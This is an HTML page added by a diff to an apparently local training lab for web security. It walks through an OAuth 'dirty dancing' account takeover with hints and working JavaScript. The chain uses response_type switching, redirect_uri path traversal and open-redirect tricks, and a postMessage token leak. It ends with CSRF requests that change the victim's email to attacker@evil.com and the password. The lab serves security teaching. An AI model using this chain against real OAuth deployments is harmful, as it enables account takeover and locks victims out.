@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: Full Dirty Dancing - Response Type Juggling - OAuth Level 3</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">OAuth #3: Full Dirty Dancing</span>
+      <span class="difficulty expert">Expert</span>
+    </div>
+  </div>
+
+  <div id="solve-banner" class="solve-banner"></div>
+
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>Perform a complete dirty dancing attack combining THREE techniques: response_type switching, redirect_uri manipulation, and postMessage token theft. Then use the stolen token to change the victim's email (full ATO).</p>
+      </div>
+
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: Response type juggling</button>
+        <div class="hint-content">Use <code>response_type=code,id_token</code> (hybrid flow). This puts the code in the query string AND an id_token in the fragment. Different response types use different response modes — the token goes in the URL fragment which is harder to protect server-side but accessible via JavaScript.</div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: Redirect URI + Open Redirect chain</button>
+        <div class="hint-content">The app has an open redirect at <code>/redirect?url=...</code>. Chain: use the legitimate callback URL with an open redirect parameter: <code>redirect_uri=http://localhost:3000/oauth/callback?next=/redirect?url=/labs/attacker/steal.html</code>. Wait — actually the redirect_uri validation is prefix-based, so use path traversal instead.</div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: The complete attack</button>
+        <div class="hint-content">
+          1. Use <code>response_type=token</code> to get token in fragment<br>
+          2. Use redirect_uri path traversal to redirect to a page you control that has a postMessage listener<br>
+          3. OR: use the simpler approach — same-origin popup + direct URL read<br>
+          4. Extract the token from the URL<br>
+          5. Call <code>/api/user/change-email</code> and <code>/api/user/change-password</code> using the victim's session<br>
+          Full ATO!
+        </div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 4: The session cookie trick</button>
+        <div class="hint-content">Even simpler: the OAuth flow sets a session cookie when the victim authenticates. After the OAuth redirect, the victim is logged in via cookie. You can CSRF the email change because it has no CSRF token. So: 1) OAuth popup authenticates victim, 2) Use the session cookie to change email via fetch with credentials:include, 3) No token needed — just the cookie!</div>
+      </div>
+
+      <h3>Techniques Combined</h3>
+      <div class="source-code">
+<pre><span class="comment">/* Full Dirty Dancing Chain */</span>
+
+<span class="comment">// 1. Response type juggling</span>
+response_type=<span class="sink">token</span>  <span class="comment">// OR code,id_token</span>
+
+<span class="comment">// 2. Redirect URI manipulation</span>
+redirect_uri=/callback/<span class="sink">..%2f..%2fattacker</span>
+
+<span class="comment">// 3. State invalidation</span>
+state=<span class="sink">INVALID</span>  <span class="comment">// Forces error page</span>
+
+<span class="comment">// 4. postMessage gadget on error page</span>
+popup.<span class="function">postMessage</span>({type:'getAnalytics'})
+
+<span class="comment">// 5. Token extraction + ATO</span>
+<span class="function">fetch</span>('/api/user/change-email', {
+  credentials: 'include',
+  body: {email: 'attacker@evil.com'}
+})
+</pre>
+      </div>
+    </div>
+
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+        <div class="lab-form" style="border:2px solid var(--danger);background:rgba(239,68,68,0.05)">
+          <h2 style="color:var(--danger);margin-bottom:12px">&#9760; Full Dirty Dancing - Account Takeover</h2>
+          <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px">Complete attack chain: OAuth manipulation + token theft + session hijack + email/password change = Full ATO</p>
+
+          <h4 style="color:var(--warning);margin-bottom:8px">Phase 1: OAuth Manipulation</h4>
+          <div style="margin-bottom:12px">
+            <label>response_type</label>
+            <select id="respType">
+              <option value="token">token (implicit - token in fragment)</option>
+              <option value="code,id_token">code,id_token (hybrid - both in URL)</option>
+              <option value="code">code (standard - code in query)</option>
+            </select>
+
+            <label>redirect_uri strategy</label>
+            <select id="redirectStrategy">
+              <option value="traversal">Path traversal (/callback/../attacker)</option>
+              <option value="normal">Normal callback (steal via same-origin)</option>
+              <option value="open-redirect">Chain with open redirect</option>
+            </select>
+
+            <label>state</label>
+            <input type="text" id="stateVal" value="INVALID_ATTACKER_STATE">
+          </div>
+          <button class="btn btn-danger" onclick="phase1()">Launch OAuth Popup</button>
+          <div id="phase1-status" style="margin-top:8px;font-size:13px"></div>
+
+          <hr style="border-color:var(--border);margin:16px 0">
+
+          <h4 style="color:var(--warning);margin-bottom:8px">Phase 2: Token/Session Theft</h4>
+          <button class="btn btn-danger" onclick="phase2()" id="phase2-btn" disabled>Steal Token & Session</button>
+          <div id="phase2-status" style="margin-top:8px;font-size:13px"></div>
+
+          <hr style="border-color:var(--border);margin:16px 0">
+
+          <h4 style="color:var(--warning);margin-bottom:8px">Phase 3: Account Takeover</h4>
+          <label>New email (attacker's)</label>
+          <input type="text" id="newEmail" value="attacker@evil.com">
+          <label>New password</label>
+          <input type="text" id="newPassword" value="hacked123">
+          <button class="btn btn-danger" onclick="phase3()" id="phase3-btn" disabled>Execute ATO - Change Credentials</button>
+          <div id="phase3-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console" style="border-color:#8b0000">
+            <div class="title" style="color:#ff4444">Full Attack Chain Log</div>
+            <div id="attack-log">
+              <div class="log" style="color:var(--text-muted)">Ready for full dirty dancing attack...</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console" style="border-color:#8b6900">
+            <div class="title" style="color:var(--warning)">Stolen Credentials & Data</div>
+            <div id="stolen-data">
+              <div class="log" style="color:var(--text-muted)">No data stolen yet...</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:16px">
+          <h3 style="font-size:14px;color:var(--text-muted);margin-bottom:8px">Server-side Action Log:</h3>
+          <div class="attacker-console">
+            <div class="title">State Changes</div>
+            <div id="csrf-log"><div class="log" style="color:var(--text-muted)">No actions yet</div></div>
+          </div>
+          <button class="btn btn-secondary" onclick="refreshLog()" style="margin-top:8px">Refresh</button>
+        </div>
+
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border-radius:8px">
+          <p style="font-size:13px;color:var(--text-muted)">
+            <strong>This is the ultimate OAuth attack chain.</strong> In the real world, each component might be harder to find, but the concept is the same: manipulate the OAuth flow to leave tokens/codes in accessible locations, use any available gadget (postMessage, referrer, open redirect) to extract them, then use the stolen credentials to take over the account.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    var popup = null;
+    var stolenToken = null;
+    var log = document.getElementById('attack-log');
+    var stolen = document.getElementById('stolen-data');
+
+    function phase1() {
+      var respType = document.getElementById('respType').value;
+      var strategy = document.getElementById('redirectStrategy').value;
+      var state = document.getElementById('stateVal').value;
+
+      var redirectUri = 'http://localhost:3000/oauth/callback';
+      if (strategy === 'traversal') {
+        redirectUri = 'http://localhost:3000/oauth/callback/../../../labs/attacker/steal.html';
+      } else if (strategy === 'open-redirect') {
+        redirectUri = 'http://localhost:3000/oauth/callback?next=' + encodeURIComponent('/redirect?url=/labs/attacker/steal.html');
+      }
+
+      var url = '/oauth/authorize?client_id=vuln-app' +
+        '&response_type=' + encodeURIComponent(respType) +
+        '&state=' + encodeURIComponent(state) +
+        '&redirect_uri=' + encodeURIComponent(redirectUri) +
+        '&scope=read,write';
+
+      log.innerHTML += '<div class="log">Phase 1: Opening OAuth popup...</div>';
+      log.innerHTML += '<div class="log">response_type: ' + respType + '</div>';
+      log.innerHTML += '<div class="log">redirect_uri strategy: ' + strategy + '</div>';
+      log.innerHTML += '<div class="log">state: ' + state + ' (invalid)</div>';
+      log.innerHTML += '<div class="log" style="color:var(--warning)">URL: ' + url.substring(0, 100) + '...</div>';
+
+      popup = window.open(url, 'oauthDirtyDancing', 'width=500,height=600');
+
+      document.getElementById('phase1-status').innerHTML =
+        '<span style="color:var(--success)">Popup opened. Authorize as victim, then proceed to Phase 2.</span>';
+      document.getElementById('phase2-btn').disabled = false;
+    }
+
+    function phase2() {
+      log.innerHTML += '<div class="log">Phase 2: Attempting token/session theft...</div>';
+
+      // Method 1: Try direct URL read (same-origin)
+      setTimeout(function() {
+        try {
+          var url = popup.location.href;
+          log.innerHTML += '<div class="log" style="color:var(--success)">Same-origin URL read successful!</div>';
+          log.innerHTML += '<div class="log">URL: ' + url.substring(0, 120) + '...</div>';
+
+          // Extract token from fragment
+          var hash = url.split('#')[1];
+          if (hash) {
+            var hParams = new URLSearchParams(hash);
+            var token = hParams.get('access_token') || hParams.get('id_token');
+            if (token) {
+              stolenToken = token;
+              stolen.innerHTML += '<div class="log" style="color:var(--danger)">ACCESS TOKEN: ' + token.substring(0, 32) + '...</div>';
+            }
+          }
+
+          // Extract code from query
+          var qParams = new URLSearchParams(url.split('?')[1]?.split('#')[0] || '');
+          var code = qParams.get('code');
+          if (code) {
+            stolen.innerHTML += '<div class="log" style="color:var(--danger)">AUTH CODE: ' + code + '</div>';
+          }
+        } catch(e) {
+          log.innerHTML += '<div class="log" style="color:var(--warning)">Cross-origin - using postMessage gadget...</div>';
+        }
+
+        // Method 2: postMessage gadget
+        if (popup && !popup.closed) {
+          popup.postMessage({ type: 'getAnalytics' }, '*');
+          log.innerHTML += '<div class="log">Sent postMessage {type:"getAnalytics"} to error page</div>';
+        }
+
+        // Method 3: Session cookie is set - we can use it
+        log.innerHTML += '<div class="log" style="color:var(--success)">Session cookie set during OAuth! Can use credentials:include for CSRF.</div>';
+        stolen.innerHTML += '<div class="log" style="color:var(--danger)">SESSION: Cookie set via OAuth authentication flow</div>';
+
+        document.getElementById('phase2-status').innerHTML =
+          '<span style="color:var(--danger)">Tokens/session captured! Proceed to Phase 3 for ATO.</span>';
+        document.getElementById('phase3-btn').disabled = false;
+      }, 3000);
+    }
+
+    // Listen for postMessage responses
+    window.addEventListener('message', function(e) {
+      if (e.data && e.data.type === 'analyticsData') {
+        log.innerHTML += '<div class="log" style="color:var(--success)">PostMessage gadget responded!</div>';
+        stolen.innerHTML += '<div class="log" style="color:var(--danger)">LEAKED URL: ' + e.data.url + '</div>';
+
+        var hash = (e.data.url || '').split('#')[1];
+        if (hash) {
+          var p = new URLSearchParams(hash);
+          if (p.get('access_token')) {
+            stolenToken = p.get('access_token');
+            stolen.innerHTML += '<div class="log" style="color:var(--danger)">TOKEN FROM GADGET: ' + stolenToken.substring(0, 32) + '...</div>';
+          }
+        }
+      }
+    });
+
+    function phase3() {
+      var newEmail = document.getElementById('newEmail').value;
+      var newPassword = document.getElementById('newPassword').value;
+
+      log.innerHTML += '<div class="log" style="color:var(--danger)">Phase 3: ACCOUNT TAKEOVER IN PROGRESS...</div>';
+
+      // Change email using session cookie (CSRF)
+      fetch('/api/user/change-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ email: newEmail })
+      })
+      .then(r => r.json())
+      .then(data => {
+        log.innerHTML += '<div class="log" style="color:var(--danger)">Email changed to: ' + newEmail + '</div>';
+        stolen.innerHTML += '<div class="log" style="color:var(--danger)">EMAIL CHANGED: ' + newEmail + '</div>';
+
+        // Change password
+        return fetch('/api/user/change-password', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'include',
+          body: JSON.stringify({ newPassword: newPassword })
+        });
+      })
+      .then(r => r.json())
+      .then(data => {
+        log.innerHTML += '<div class="log" style="color:var(--danger)">Password changed!</div>';
+        stolen.innerHTML += '<div class="log" style="color:var(--danger)">PASSWORD CHANGED</div>';
+        stolen.innerHTML += '<div class="log" style="color:var(--danger);font-size:14px">*** FULL ACCOUNT TAKEOVER COMPLETE ***</div>';
+
+        document.getElementById('phase3-status').innerHTML =
+          '<span style="color:var(--danger);font-weight:bold">FULL ATO ACHIEVED! Email + password changed. Victim locked out.</span>';
+
+        solveLab('oauth-3');
+        setTimeout(refreshLog, 500);
+      })
+      .catch(err => {
+        log.innerHTML += '<div class="log" style="color:var(--danger)">Error: ' + err.message + '</div>';
+      });
+    }
+
+    function refreshLog() {
+      fetch('/api/csrf-log')
+        .then(r => r.json())
+        .then(actions => {
+          var el = document.getElementById('csrf-log');
+          el.innerHTML = actions.length === 0 ?
+            '<div class="log" style="color:var(--text-muted)">No actions</div>' :
+            actions.map(a =>
+              '<div class="log" style="color:' + (a.action.includes('change') ? 'var(--danger)' : 'var(--text-secondary)') + '">[' + a.action + '] ' + a.user +
+              (a.newEmail ? ' → ' + a.newEmail : '') + '</div>'
+            ).join('');
+        });
+    }
+  </script>
+</body>
+</html>
